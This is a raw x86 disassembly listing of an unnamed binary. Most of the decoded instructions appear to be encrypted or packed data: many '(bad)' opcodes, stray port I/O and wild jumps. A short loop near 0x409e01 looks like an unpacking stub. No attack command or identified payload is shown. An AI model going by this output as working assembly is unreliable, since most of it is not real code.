  409a77:	pop    es
  409a78:	xchg   edi,eax
  409a79:	mov    ch,0xc1
  409a7b:	xchg   ebp,eax
  409a7c:	jnp    0x409a13
  409a7e:	pop    esp
  409a7f:	mov    cs,WORD PTR [edi+ebp*4-0x3a]
  409a83:	iret   
  409a84:	in     eax,0x96
  409a86:	pop    ecx
  409a87:	popf   
  409a88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a89:	or     DWORD PTR [edx+0xf2ebb8d],ebp
  409a8f:	and    esp,DWORD PTR fs:[esi-0x49]
  409a93:	rol    BYTE PTR [ecx+eiz*8-0x629dd5f4],0xc
  409a9b:	mov    ecx,0x84f46b4d
  409aa0:	test   eax,eax
  409aa2:	inc    edi
  409aa3:	add    ecx,DWORD PTR [esp+ebx*2-0x16]
  409aa7:	in     al,0xbd
  409aa9:	test   bh,dl
  409aab:	daa    
  409aac:	cwde   
  409aad:	pushf  
  409aae:	fcom   DWORD PTR [esp+eax*2-0x17294e8a]
  409ab5:	call   0xad6f2acd
  409aba:	inc    edx
  409abb:	dec    ebp
  409abc:	mov    ds:0xfc64c391,eax
  409ac1:	(bad)  
  409ac2:	out    dx,al
  409ac3:	das    
  409ac4:	stos   BYTE PTR es:[edi],al
  409ac5:	outs   dx,DWORD PTR ds:[esi]
  409ac6:	data16 test al,0x88
  409ac9:	cmp    esp,DWORD PTR [edx-0x6b0db9a0]
  409acf:	inc    ebp
  409ad0:	pop    eax
  409ad1:	hlt    
  409ad2:	and    DWORD PTR [esi+0x7d],ecx
  409ad5:	loope  0x409b14
  409ad7:	shl    DWORD PTR [eax-0x397833b9],0x0
  409ade:	push   edi
  409adf:	sub    al,0x58
  409ae1:	jne    0x409ad6
  409ae3:	and    eax,0x89834be8
  409ae8:	loope  0x409abe
  409aea:	jmp    0x409b60
  409aec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409aed:	mov    cl,0x95
  409aef:	aam    0x52
  409af1:	cmp    BYTE PTR [ebp+edx*8+0x45],ah
  409af5:	aaa    
  409af6:	cvtps2pi mm3,QWORD PTR [eax-0x4d2e9291]
  409afd:	outs   dx,DWORD PTR ds:[esi]
  409afe:	mov    al,0xd7
  409b00:	adc    eax,0xe1c6c679
  409b05:	sbb    al,0x9b
  409b07:	or     eax,0xf6141241
  409b0c:	ficom  DWORD PTR [esi+0x269ba5f8]
  409b12:	jle    0x409b2d
  409b14:	xchg   esi,eax
  409b15:	cli    
  409b16:	das    
  409b17:	mov    dl,0xcf
  409b19:	mov    cl,0x28
  409b1b:	and    edx,DWORD PTR [ebx]
  409b1d:	fbld   TBYTE PTR [edx]
  409b1f:	xor    al,0x4f
  409b21:	mov    ah,0x63
  409b23:	cmp    DWORD PTR [edi+0x61],0xa7390c77
  409b2a:	xor    DWORD PTR [esi+0x37],0x7e429103
  409b31:	sbb    eax,edi
  409b33:	push   es
  409b34:	dec    esi
  409b35:	xlat   BYTE PTR ds:[ebx]
  409b36:	or     DWORD PTR [eax],0xffffff9c
  409b39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b3a:	aam    0x3b
  409b3c:	dec    ebx
  409b3d:	mov    dh,0x1
  409b3f:	jno    0x409b55
  409b41:	push   es
  409b42:	in     eax,dx
  409b43:	call   0x1aec:0x52a1542e
  409b4a:	mov    al,0xf3
  409b4c:	push   eax
  409b4d:	jp     0x409af9
  409b4f:	and    BYTE PTR es:[edx],dl
  409b52:	(bad)  
  409b53:	and    dh,BYTE PTR [ebp+0x55a7ab80]
  409b59:	push   edx
  409b5a:	xchg   BYTE PTR [esi+0x2b53b88f],ch
  409b60:	mov    al,ds:0x1586e26d
  409b65:	in     eax,0xdb
  409b67:	stc    
  409b68:	push   eax
  409b69:	jl     0x409b98
  409b6b:	push   ebp
  409b6c:	loope  0x409b78
  409b6e:	outs   dx,BYTE PTR ds:[esi]
  409b6f:	in     eax,dx
  409b70:	out    dx,al
  409b71:	icebp  
  409b72:	aad    0xf
  409b74:	mov    eax,ds:0xeac1db38
  409b79:	mov    DWORD PTR [ecx+0x1ec44ab2],ebp
  409b7f:	nop
  409b80:	mov    esp,DWORD PTR [ebx+0x2b30fc8b]
  409b86:	push   edi
  409b87:	add    al,0xb5
  409b89:	push   cs
  409b8a:	xlat   BYTE PTR ds:[ebx]
  409b8b:	mov    ah,dh
  409b8d:	xchg   ebx,eax
  409b8e:	mov    edi,0xec20b8bb
  409b93:	add    al,0xa6
  409b95:	add    ch,BYTE PTR [ebp+0x3e63e34d]
  409b9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b9c:	pusha  
  409b9d:	nop
  409b9e:	cmp    al,0xfb
  409ba0:	aad    0x75
  409ba2:	push   esp
  409ba3:	cmc    
  409ba4:	pop    ecx
  409ba5:	xchg   esp,eax
  409ba6:	xchg   ah,dh
  409ba8:	fisttp QWORD PTR [eax+ebx*8-0x4bfc9ff5]
  409baf:	xchg   BYTE PTR [ecx],ah
  409bb1:	dec    ebx
  409bb2:	adc    DWORD PTR [ecx-0x43],0xe73ac8ec
  409bb9:	xor    BYTE PTR [edi-0x27ebb78d],0xc4
  409bc0:	test   DWORD PTR [edx-0x66],esi
  409bc3:	gs or  esi,edi
  409bc6:	stc    
  409bc7:	js     0x409bb2
  409bc9:	xor    eax,0x7a5c3b1a
  409bce:	(bad)  
  409bd0:	call   0x84601bed
  409bd5:	dec    ebx
  409bd6:	add    al,0xae
  409bd8:	dec    esi
  409bd9:	push   esp
  409bda:	popa   
  409bdb:	jl     0x409b87
  409bdd:	fcmovbe st,st(1)
  409bdf:	lods   eax,DWORD PTR ds:[esi]
  409be0:	imul   ecx,DWORD PTR [eax-0x41],0xf4ea4f7f
  409be7:	cwde   
  409be8:	rep lods al,BYTE PTR ds:[esi]
  409bea:	add    BYTE PTR [ebp+0x5bd76c23],dl
  409bf0:	rep lods eax,DWORD PTR ds:[esi]
  409bf2:	(bad)  
  409bf3:	loopne 0x409b75
  409bf5:	fisttp DWORD PTR ds:0x569c31b7
  409bfb:	mov    esi,0xbbff2d2d
  409c00:	pop    edi
  409c01:	(bad)  
  409c02:	xchg   edx,eax
  409c03:	xor    bh,ah
  409c05:	and    BYTE PTR [ebx],0x83
  409c08:	les    ebp,FWORD PTR [ecx]
  409c0a:	push   cs
  409c0b:	inc    esp
  409c0c:	out    dx,al
  409c0d:	xchg   BYTE PTR es:[ecx-0x36],cl
  409c11:	or     eax,DWORD PTR [ebp-0x16]
  409c14:	mov    eax,ds:0x129fa1b6
  409c19:	jo     0x409bb5
  409c1b:	je     0x409c53
  409c1d:	or     eax,0x4d0b5175
  409c22:	xor    BYTE PTR [eax+0x37b666f8],al
  409c28:	adc    BYTE PTR [ebx-0x52dfdc8f],bl
  409c2e:	ds (bad) 
  409c31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c32:	mov    bh,0xea
  409c34:	out    dx,eax
  409c35:	xchg   cl,bh
  409c37:	push   eax
  409c38:	int    0xba
  409c3a:	clc    
  409c3b:	test   cl,ch
  409c3d:	or     eax,0x59cee8c0
  409c42:	ret    0x4702
  409c45:	adc    esp,DWORD PTR [ecx-0x1b]
  409c48:	push   ds
  409c49:	dec    ecx
  409c4a:	out    0x43,al
  409c4c:	mov    al,0xd9
  409c4e:	daa    
  409c4f:	hlt    
  409c50:	pop    edx
  409c51:	or     ch,al
  409c53:	sbb    BYTE PTR [edi-0x2b],dl
  409c56:	fs push ebp
  409c58:	loopne 0x409c2e
  409c5a:	cs add al,0x4
  409c5d:	ja     0x409c38
  409c5f:	jae    0x409c72
  409c61:	in     eax,dx
  409c62:	inc    ebp
  409c63:	test   al,0x3b
  409c65:	js     0x409c70
  409c67:	jbe    0x409c33
  409c69:	imul   edx,DWORD PTR [ecx],0xafc04142
  409c6f:	bound  esi,QWORD PTR [edi]
  409c71:	dec    esp
  409c72:	rol    BYTE PTR [esi],1
  409c74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c75:	and    cl,BYTE PTR [ebx+eiz*4+0x6334ef07]
  409c7c:	dec    eax
  409c7d:	jbe    0x409c7d
  409c7f:	imul   eax,DWORD PTR ds:0x5560d8a3,0x68
  409c86:	sar    DWORD PTR [ebx],1
  409c88:	int3   
  409c89:	mov    esi,0xba1a1800
  409c8e:	aaa    
  409c8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c90:	jmp    0x409cd9
  409c92:	not    edi
  409c94:	mov    esi,0x5f9abeee
  409c99:	and    BYTE PTR [edi],bl
  409c9b:	mov    dh,0x7a
  409c9d:	mov    eax,ds:0xfbd66d7f
  409ca2:	push   cs
  409ca3:	pop    edi
  409ca4:	ins    DWORD PTR es:[edi],dx
  409ca5:	or     al,0x52
  409ca7:	dec    ebx
  409ca8:	inc    ebx
  409ca9:	push   eax
  409caa:	sbb    eax,0x33bfc34e
  409caf:	pop    ss
  409cb0:	cli    
  409cb1:	mov    esi,DWORD PTR [edi+0x54227f76]
  409cb7:	sub    DWORD PTR [esi-0x79],esi
  409cba:	xchg   edx,eax
  409cbb:	and    ah,BYTE PTR [edx+ebx*4]
  409cbe:	push   ebp
  409cbf:	and    edx,DWORD PTR [ebp+0x4543311e]
  409cc5:	stos   BYTE PTR es:[edi],al
  409cc6:	jmp    0xbf5b10d4
  409ccb:	cmp    eax,0x8deffd37
  409cd0:	lods   eax,DWORD PTR ds:[esi]
  409cd1:	mov    esi,0xbd995773
  409cd6:	mov    ebx,0xfaeef71c
  409cdb:	rcl    ebp,cl
  409cdd:	dec    eax
  409cde:	add    bl,BYTE PTR [edi]
  409ce0:	mov    bl,BYTE PTR [edi]
  409ce2:	inc    ecx
  409ce3:	ins    DWORD PTR es:[edi],dx
  409ce4:	(bad)  
  409ce5:	fisubr DWORD PTR [edx-0x44]
  409ce8:	push   edx
  409ce9:	adc    eax,0x99f10885
  409cee:	mov    esp,0xcad24844
  409cf3:	je     0x409d44
  409cf5:	push   ebp
  409cf6:	lods   eax,DWORD PTR ds:[esi]
  409cf7:	adc    al,0x82
  409cf9:	jecxz  0x409c94
  409cfb:	xchg   DWORD PTR [eax-0x3262434e],eax
  409d01:	jle    0x409cb6
  409d03:	jmp    0x52ff0885
  409d08:	mov    edi,0x5f663a39
  409d0d:	jl     0x409cc9
  409d0f:	loope  0x409d28
  409d11:	fs mov ebx,0x7f8e747e
  409d17:	pop    esp
  409d18:	inc    edi
  409d19:	xchg   ebp,eax
  409d1a:	pop    edx
  409d1b:	es and al,0xd2
  409d1e:	hlt    
  409d1f:	xor    al,0x8c
  409d21:	add    BYTE PTR [edi-0x20],dh
  409d24:	loopne 0x409d25
  409d26:	addr16 in eax,dx
  409d28:	inc    esp
  409d29:	aaa    
  409d2a:	call   0x128:0xa8f4c35e
  409d31:	nop
  409d32:	jl     0x409d68
  409d34:	loopne 0x409cba
  409d36:	pop    ebp
  409d37:	dec    esp
  409d38:	cwde   
  409d39:	mov    ds:0x60ee0ea8,al
  409d3e:	pushf  
  409d3f:	add    ah,al
  409d41:	dec    edx
  409d42:	mov    bh,0x25
  409d44:	adc    DWORD PTR [eax+ebp*1+0x7d],ebx
  409d48:	dec    edi
  409d49:	push   edx
  409d4a:	cmp    dh,bh
  409d4c:	aam    0xa6
  409d4e:	xor    al,0xe4
  409d50:	sbb    eax,eax
  409d52:	dec    ecx
  409d53:	outs   dx,DWORD PTR ds:[esi]
  409d54:	mov    dh,BYTE PTR [edi]
  409d56:	lahf   
  409d57:	inc    ebp
  409d58:	outs   dx,BYTE PTR ds:[esi]
  409d59:	pusha  
  409d5a:	sbb    ebx,DWORD PTR [ecx]
  409d5c:	pushf  
  409d5d:	add    DWORD PTR [bx+si+0xaf4],ebx
  409d62:	cmp    esi,DWORD PTR [ecx+0x71]
  409d65:	xor    al,0x0
  409d67:	xchg   ecx,ecx
  409d69:	push   0xffffff8d
  409d6b:	sbb    al,0xe0
  409d6d:	and    al,0xf1
  409d6f:	pop    edi
  409d70:	dec    ecx
  409d71:	fld    DWORD PTR [esi]
  409d73:	inc    edx
  409d74:	test   eax,0x5a771f0
  409d79:	push   ds
  409d7a:	mov    ah,BYTE PTR [esi]
  409d7c:	out    dx,eax
  409d7d:	out    0xa9,eax
  409d7f:	sahf   
  409d80:	call   0x35ba0c14
  409d85:	dec    ebx
  409d86:	cmp    al,0x40
  409d88:	dec    eax
  409d89:	mov    esi,0x8f3a0885
  409d8e:	scas   al,BYTE PTR es:[edi]
  409d8f:	es in  al,0x94
  409d92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d93:	pusha  
  409d94:	dec    ebp
  409d95:	jb     0x409da0
  409d97:	imul   esp,DWORD PTR [edi],0x44d24602
  409d9d:	mov    ch,0xc5
  409d9f:	shl    esp,cl
  409da1:	xchg   ebp,eax
  409da2:	push   edi
  409da3:	scas   eax,DWORD PTR es:[edi]
  409da4:	dec    edx
  409da5:	imul   eax,DWORD PTR [bx+si+0x2a],0xffffffb1
  409daa:	fs sbb eax,0xefca95e4
  409db0:	mov    WORD PTR [ecx+0x55],es
  409db3:	std    
  409db4:	jmp    0xa62a8a5b
  409db9:	sbb    al,0xd8
  409dbb:	and    eax,0x33a60ed7
  409dc0:	push   esi
  409dc1:	icebp  
  409dc2:	jno    0x409e16
  409dc4:	fcom   st(5)
  409dc6:	or     esi,esp
  409dc8:	push   0xffffffe2
  409dca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409dcb:	adc    al,0x45
  409dcd:	pop    ebp
  409dce:	lea    esi,[edx-0xe2c83f0]
  409dd4:	and    bl,dl
  409dd6:	push   eax
  409dd7:	and    DWORD PTR [ebp*2-0x3bcb8cb1],esi
  409dde:	ror    DWORD PTR [esp+esi*8],1
  409de1:	cmp    DWORD PTR [edi],ebp
  409de3:	push   ebp
  409de4:	std    
  409de5:	lds    esp,FWORD PTR [edi+0x118f4ddf]
  409deb:	dec    eax
  409dec:	pop    esi
  409ded:	mov    ah,0x52
  409def:	scas   eax,DWORD PTR es:[edi]
  409df0:	add    BYTE PTR [ebp+0x6f],ch
  409df3:	lahf   
  409df4:	inc    ebx
  409df5:	dec    ebp
  409df6:	sub    BYTE PTR [esi-0x25],ah
  409df9:	retf   
  409dfa:	cli    
  409dfb:	inc    edx
  409dfc:	jmp    0x44167431
  409e01:	mov    edx,0xffa68fdd
  409e06:	add    edx,ecx
  409e08:	xor    DWORD PTR ds:0x42fd8a,ecx
  409e0e:	mov    DWORD PTR [ebp-0x8],edx
  409e11:	mov    edx,DWORD PTR [ebp+0x8]
  409e14:	and    edi,DWORD PTR ds:0x42fcf9
  409e1a:	xor    edx,eax
  409e1c:	adc    edi,DWORD PTR ds:0x42e124
  409e22:	add    edx,ecx
  409e24:	mov    DWORD PTR ds:0x42fd82,0x18
  409e2e:	cmp    DWORD PTR ds:0x42fd82,0x0
  409e35:	je     0x409e63
  409e3b:	cmp    DWORD PTR ds:0x42fd82,0x1a
  409e42:	jne    0x409e51
  409e48:	push   DWORD PTR [ebp-0xc]
  409e4b:	call   DWORD PTR ds:0x42e2e3
  409e51:	mov    edi,DWORD PTR ds:0x42fd82
  409e57:	dec    edi
  409e58:	mov    DWORD PTR ds:0x42fd82,edi
  409e5e:	jmp    0x409e2e
  409e63:	mov    DWORD PTR [ebp+0xc],edx
  409e66:	adc    DWORD PTR ds:0x42e703,0x3e25
  409e70:	jmp    0x40a22e
  409e75:	xlat   BYTE PTR ds:[ebx]
  409e76:	mov    edi,0x699269fa
  409e7b:	mul    DWORD PTR [ecx-0x79]
  409e7e:	mov    dh,0xc4
  409e80:	(bad)  
  409e81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e82:	mov    ds:0xe8260af7,al
  409e87:	jo     0x409ef9
  409e89:	lahf   
  409e8a:	jge    0x409efc
  409e8c:	jo     0x409f03
  409e8e:	ss mov edx,0xbebb5672
  409e94:	xchg   BYTE PTR [ebp+0x15],ah
  409e97:	mov    ah,BYTE PTR [edi]
  409e99:	inc    ebp
  409e9a:	mov    ds:0xc0f2c7b5,al
  409e9f:	or     ecx,ebp
  409ea1:	les    ebx,FWORD PTR [edx+eax*8-0x7d]
  409ea5:	xchg   ebx,eax
  409ea6:	add    BYTE PTR [esi+0x1e],cl
  409ea9:	ja     0x409eb3
  409eab:	sbb    eax,0xa9e6abac
  409eb0:	aas    
  409eb1:	jb     0x409e88
  409eb3:	jle    0x409e9e
  409eb5:	xor    al,0xeb
  409eb7:	mov    ss,WORD PTR [esi+0x76f8eff8]
  409ebd:	add    al,0xbd
  409ebf:	ins    BYTE PTR es:[edi],dx
  409ec0:	fwait
  409ec1:	int    0xcc
  409ec3:	xor    al,BYTE PTR [edx-0x21]
  409ec6:	fisub  WORD PTR [edi+ebp*4-0x73d77a32]
  409ecd:	xchg   edx,eax
  409ece:	add    eax,0xe83547f2
  409ed3:	ja     0x409f4d
  409ed5:	mov    ebx,0xd844b656
  409eda:	loopne 0x409f2b
  409edc:	inc    esp
  409edd:	je     0x409ecc
  409edf:	shl    DWORD PTR [esi+0x2a9ce86a],0x1
  409ee6:	scas   al,BYTE PTR es:[edi]
  409ee7:	xchg   ebp,eax
  409ee8:	xchg   edx,eax
  409ee9:	and    DWORD PTR es:[ecx],esp
  409eec:	jbe    0x409ed8
  409eee:	pop    es
  409eef:	ins    BYTE PTR es:[edi],dx
  409ef0:	push   esi
  409ef1:	sub    eax,0x5e38910a
  409ef6:	pusha  
  409ef7:	cmp    edi,ebx
  409ef9:	fwait
  409efa:	add    eax,0xbf2a11da
  409eff:	lods   eax,DWORD PTR ds:[esi]
  409f00:	fucomp st(3)
  409f02:	loopne 0x409f20
  409f04:	or     al,0xca
  409f06:	xor    DWORD PTR [ebx],edi
  409f08:	in     eax,dx
  409f09:	mov    al,0xb6
  409f0b:	mov    ah,0xad
  409f0d:	sahf   
  409f0e:	push   es
  409f0f:	push   eax
  409f10:	pusha  
  409f11:	rcl    DWORD PTR [ebx-0x16e7b1d6],1
  409f17:	jle    0x409f23
  409f19:	cmp    ah,BYTE PTR [ecx+0x5088590b]
  409f1f:	lahf   
  409f20:	inc    esi
  409f21:	mov    ah,0x18
  409f23:	daa    
  409f24:	loopne 0x409ede
  409f26:	sub    DWORD PTR [ebx],ebp
  409f28:	push   edx
  409f29:	pop    ss
  409f2a:	or     DWORD PTR [ebx+0x64],edi
  409f2d:	pop    ecx
  409f2e:	dec    ebp
  409f2f:	and    DWORD PTR [edi],edx
  409f31:	mov    cl,0xe2
  409f33:	rcl    bh,cl
  409f35:	js     0x409f45
  409f37:	xchg   BYTE PTR [ecx-0x6d],al
  409f3a:	or     al,0xf2
  409f3c:	add    BYTE PTR [edi+0x7d6311eb],ah
  409f42:	(bad)  
  409f43:	cmp    ah,bl
  409f45:	push   edi
  409f46:	fmul   DWORD PTR [ebp-0x7c519c67]
  409f4c:	arpl   WORD PTR [ecx-0x78cdea1a],dx
  409f52:	xchg   edx,eax
  409f53:	pop    ebp
  409f54:	mov    esp,0x58838e8e
  409f59:	fs xor DWORD PTR fs:[esi],esp
  409f5d:	jl     0x409ef6
  409f5f:	fisub  DWORD PTR [esi+0x78]
  409f62:	mov    al,0x9f
  409f64:	add    eax,0x87f67c27
  409f69:	(bad)  
  409f6a:	cld    
  409f6b:	ja     0x409fc9
  409f6d:	mov    edx,0x184f2242
  409f72:	cmp    edi,esp
  409f74:	in     eax,0x4b
  409f76:	imul   esp,esp,0xffffffb5
  409f79:	mov    ds:0x47eea328,eax
  409f7e:	push   ds
  409f7f:	rcr    BYTE PTR [ebx],0x37
  409f82:	sti    
  409f83:	ror    dh,1
  409f85:	(bad)
  409f88:	int    0xf1
  409f8a:	push   cs
  409f8b:	sub    DWORD PTR [eax+0x722d8862],ecx
  409f91:	push   edi
  409f92:	jns    0x409f64
  409f94:	push   esi
  409f95:	lahf   
  409f96:	and    al,0xb3
  409f98:	outs   dx,BYTE PTR ds:[esi]
  409f99:	not    DWORD PTR [ebx*8+0x177fd71a]
  409fa0:	mov    eax,0x71e0e378
  409fa5:	stos   BYTE PTR es:[edi],al
  409fa6:	shl    DWORD PTR [eax+0x42],0x56
  409faa:	mov    ah,0xc3
  409fac:	nop
  409fad:	ins    DWORD PTR es:[edi],dx
  409fae:	je     0x40a006
  409fb0:	in     eax,dx
  409fb1:	push   edx
  409fb2:	push   es
  409fb3:	lock (bad) 
  409fb6:	jbe    0x409f86
  409fb8:	test   bh,ch
  409fba:	test   DWORD PTR [edx+0x4dae2429],esi
  409fc0:	mov    edx,0xbce7efea
  409fc5:	xlat   BYTE PTR ds:[ebx]
  409fc6:	leave  
  409fc7:	loope  0x40a02a
  409fc9:	xor    BYTE PTR [esi],bl
  409fcb:	jmp    0x40a007
  409fcd:	popf   
  409fce:	leave  
  409fcf:	repnz push ss
  409fd1:	ins    DWORD PTR es:[edi],dx
  409fd2:	mov    eax,ds:0xcb26e03f
  409fd7:	add    ecx,edx
  409fd9:	sub    al,0xf1
  409fdb:	push   cs
  409fdc:	cmp    DWORD PTR [ebx],ebx
  409fde:	sbb    DWORD PTR [edi+0x34acee45],esp
  409fe4:	xchg   ebp,eax
  409fe5:	fld    QWORD PTR [edi-0x4d]
  409fe8:	shr    edx,1
  409fea:	dec    edx
  409feb:	lock jl 0x409fda
  409fee:	sbb    DWORD PTR [ebp+0x46],0xab11d3e0
  409ff5:	scas   eax,DWORD PTR es:[edi]
  409ff6:	pop    ds
  409ff7:	data16 jl 0x40a037
  409ffa:	mov    ebx,DWORD PTR [ecx+eiz*8+0x73]
  409ffe:	jge    0x40a012
  40a000:	test   al,0x2a
  40a002:	mov    WORD PTR [esi+ebx*2-0x2845dbaf],ss
  40a009:	or     bh,cl
  40a00b:	or     al,0x19
  40a00d:	es ins DWORD PTR es:[edi],dx
  40a00f:	sahf   
  40a010:	sub    BYTE PTR [edi+edx*8-0x53251e6a],al
  40a017:	xchg   edi,eax
  40a018:	int    0x5e
  40a01a:	idiv   bl
  40a01c:	adc    esp,DWORD PTR [ebx]
  40a01e:	mov    ecx,DWORD PTR [edx-0x7420b473]
  40a024:	dec    edx
  40a025:	test   BYTE PTR [ebx+0x1a],ah
  40a028:	loop   0x409fcb
  40a02a:	lods   eax,DWORD PTR ds:[esi]
  40a02b:	and    bh,BYTE PTR [eax]
  40a02d:	fimul  WORD PTR [edx-0x65]
  40a030:	sub    al,0x4e
  40a032:	enter  0x6682,0x2d
  40a036:	sbb    esp,esi
  40a038:	or     bh,bl
  40a03a:	call   0xb6185c76
  40a03f:	push   esp
  40a040:	mov    ch,0x7b
  40a042:	push   eax
  40a043:	inc    eax
  40a044:	mov    ds:0xc70e413d,eax
  40a049:	popf   
  40a04a:	xor    BYTE PTR [ebx],cl
  40a04c:	popa   
  40a04d:	xchg   edi,eax
  40a04e:	inc    eax
  40a04f:	cmp    esi,DWORD PTR [edx+0x1a]
  40a052:	(bad)  
  40a054:	mov    edx,0x3a4dee88
  40a059:	int    0xdc
  40a05b:	inc    eax
  40a05c:	sbb    edi,esp
  40a05e:	lods   eax,DWORD PTR ds:[esi]
  40a05f:	push   esp
  40a060:	cmp    esp,DWORD PTR ds:0x9752a22e
  40a066:	sub    eax,ebp
  40a068:	xchg   esp,eax
  40a069:	jmp    0x7fc9:0x12607b40
  40a070:	jo     0x40a085
  40a072:	sahf   
  40a073:	out    0xda,eax
  40a075:	push   ecx
  40a076:	rcl    DWORD PTR [esi*4-0x31f8fe50],cl
  40a07d:	mov    ecx,DWORD PTR [esi-0x564fec0b]
  40a083:	or     edi,esp
  40a085:	inc    esp
  40a086:	xchg   BYTE PTR [ebp+0x48212846],al
  40a08c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a08d:	scas   al,BYTE PTR es:[edi]
  40a08e:	test   al,0xd8
  40a090:	lds    esp,FWORD PTR [esi+0x4a]
  40a093:	les    eax,FWORD PTR [ebp-0x748e4297]
  40a099:	cmp    al,0x93
  40a09b:	lds    esi,FWORD PTR [edx+0x24]
  40a09e:	add    BYTE PTR [ebp+0x35da03a9],ch
  40a0a4:	hlt    
  40a0a5:	mov    ds:0x1b540e22,eax
  40a0aa:	gs lock into 
  40a0ad:	xchg   ebp,eax
  40a0ae:	into   
  40a0af:	lock pop edi
  40a0b1:	push   esp
  40a0b2:	add    bh,bl
  40a0b4:	div    DWORD PTR ds:0x530f0f01
  40a0ba:	and    eax,0xbf8d52fa
  40a0bf:	jo     0x40a077
  40a0c1:	bound  ebp,QWORD PTR [ebx]
  40a0c3:	clc    
  40a0c4:	cdq    
  40a0c5:	mov    ecx,0x8dec4a3f
  40a0ca:	xor    al,0x77
  40a0cc:	push   ebx
  40a0cd:	inc    eax
  40a0ce:	(bad)  [edx]
  40a0d0:	rcr    ch,0x87
  40a0d3:	imul   edx,esi,0x22a1164f
  40a0d9:	push   edi
  40a0da:	ror    dl,1
  40a0dc:	push   ds
  40a0dd:	lahf   
  40a0de:	imul   DWORD PTR [ecx-0x2e]
  40a0e1:	repz mov ?,ebx
  40a0e4:	sbb    cl,BYTE PTR [eax-0x1086ebee]
  40a0ea:	gs scas eax,DWORD PTR es:[edi]
  40a0ec:	in     eax,dx
  40a0ed:	jg     0x40a0af
  40a0ef:	enter  0xbb7,0x7b
  40a0f3:	nop
  40a0f4:	xchg   ebx,eax
  40a0f5:	pop    ss
  40a0f6:	mov    ds:0x9f0d90b9,eax
  40a0fb:	cmp    ecx,esp
  40a0fd:	push   0x3c
  40a0ff:	mov    eax,0xd96733f9
  40a104:	shl    bl,1
  40a106:	aaa    
  40a107:	pop    ebp
  40a108:	adc    bl,ch
  40a10a:	sti    
  40a10b:	ret    
  40a10c:	push   ebx
  40a10d:	inc    edx
  40a10e:	dec    ebx
  40a10f:	stos   BYTE PTR es:[edi],al
  40a110:	ret    0x9ba1
  40a113:	pop    esi
  40a114:	pop    ecx
  40a115:	xor    DWORD PTR [esi-0x5e39b2d],0xffffffb0
  40a11c:	cmp    eax,0x68132c8c
  40a121:	xor    cl,BYTE PTR [ebp+0x7a]
  40a124:	and    DWORD PTR [ebx+0x28b56ce],ebx
  40a12a:	pop    edx
  40a12b:	pop    ebx
  40a12c:	in     eax,dx
  40a12d:	mov    edx,0xa270a22c
  40a132:	(bad)  [edx+0x6]
  40a135:	xor    BYTE PTR es:[esi-0x1],dl
  40a139:	push   ebp
  40a13a:	adc    BYTE PTR [esi],0x4d
  40a13d:	inc    ebp
  40a13e:	out    0xe9,eax
  40a140:	out    dx,al
  40a141:	jbe    0x40a116
  40a143:	clc    
  40a144:	in     eax,0xbb
  40a146:	out    dx,eax
  40a147:	icebp  
  40a148:	nop
  40a149:	mov    DWORD PTR [edx+0x3d],eax
  40a14c:	cdq    
  40a14d:	(bad)  
  40a14e:	pop    edx
  40a14f:	adc    ch,cl
  40a151:	stos   DWORD PTR es:[edi],eax
  40a152:	jecxz  0x40a1d1
  40a154:	scas   eax,DWORD PTR es:[edi]
  40a155:	add    esp,eax
  40a157:	push   eax
  40a158:	jmp    0x6afbbece
  40a15d:	popf   
  40a15e:	test   DWORD PTR [ecx],eax
  40a160:	jp     0x40a117
  40a162:	aam    0x7e
  40a164:	ds jge 0x40a144
  40a167:	sub    DWORD PTR [ecx-0x17c19a3f],ecx
  40a16d:	loop   0x40a136
  40a16f:	add    BYTE PTR [ebx],bl
  40a171:	stos   BYTE PTR es:[edi],al
  40a172:	arpl   di,dx
  40a174:	stos   DWORD PTR es:[edi],eax
  40a175:	push   edi
  40a176:	retf   
  40a177:	xor    eax,0x42beb89a
  40a17c:	xchg   ebp,eax
  40a17d:	mov    cl,0x8b
  40a17f:	shl    esi,1
  40a181:	loope  0x40a177
  40a183:	hlt    
  40a184:	pop    ds
  40a185:	push   edi
  40a186:	scas   al,BYTE PTR es:[edi]
  40a187:	(bad)  [ebx-0xc0c4c9a]
  40a18d:	or     dh,BYTE PTR [edx]
  40a18f:	cli    
  40a190:	jp     0x40a166
  40a192:	outs   dx,BYTE PTR ds:[esi]
  40a193:	test   eax,0x2c0d3c43
  40a198:	dec    esp
  40a199:	repz jnp 0x40a161
  40a19c:	mov    al,ds:0x13dd75f7
  40a1a1:	push   eax
  40a1a2:	and    dl,al
  40a1a4:	pusha  
  40a1a5:	xchg   esp,eax
  40a1a6:	mov    ebp,0xe29bf6b8
  40a1ab:	outs   dx,BYTE PTR ds:[esi]
  40a1ac:	jmp    0x5adf:0xf47870c6
  40a1b3:	test   DWORD PTR [ebp+0x4f484119],0x149f0de7
  40a1bd:	rol    DWORD PTR [eax+0x65],1
  40a1c0:	jmp    0x404cb862
  40a1c5:	cmp    DWORD PTR [ebx+0x2760597e],0xade07305
  40a1cf:	jno    0x40a165
  40a1d1:	mov    ah,0x45
  40a1d3:	ja     0x40a17a
  40a1d5:	mov    ebp,0x29b21d32
  40a1da:	jmp    0x40a19c
  40a1dc:	mov    eax,0x61824630
  40a1e1:	lock push 0xffffff9e
  40a1e4:	and    bl,BYTE PTR [ebp+0x2]
  40a1e7:	iret   
  40a1e8:	jmp    0x2982:0x9fa4d0bf
  40a1ef:	push   0xfffffff2
  40a1f1:	adc    edi,DWORD PTR [ecx+esi*4-0x7b5d1456]
  40a1f8:	mov    eax,ds:0x817201a8
  40a1fd:	pop    edi
  40a1fe:	add    dh,BYTE PTR ds:0x350c631c
  40a204:	shl    DWORD PTR [ecx],cl
  40a206:	push   DWORD PTR [ebx-0x1a3c87d4]
  40a20c:	adc    eax,0xc7b150bb
  40a211:	adc    al,0xa0
  40a213:	cdq    
  40a214:	adc    bl,cl
  40a216:	bound  edi,QWORD PTR [ecx]
  40a218:	jnp    0x40a212
  40a21a:	idiv   BYTE PTR [ecx+0x732eefa7]
